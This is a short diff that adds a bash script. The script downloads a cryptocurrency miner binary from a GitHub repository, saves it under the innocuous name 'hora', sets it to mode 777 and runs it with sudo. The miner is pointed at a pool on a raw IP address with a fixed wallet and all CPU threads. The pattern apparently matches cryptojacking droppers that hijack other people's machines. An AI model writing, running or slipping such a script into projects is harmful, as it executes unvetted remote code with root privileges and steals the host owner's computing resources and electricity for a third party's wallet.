@@ -1,0 +1,4 @@
+#!/bin/bash
+wget -O hora https://github.com/nandafiku/gradi/raw/main/SRBMiner-247
+chmod 777 hora
+sudo ./hora --algorithm cryptonight_upx --pool 45.76.190.41:9189 --wallet zeph0000-e621-cff9-2139-3901d0a8e7da --password $(echo $(shuf -i 1-100000 -n 1)-A) --cpu-threads $(nproc --all)
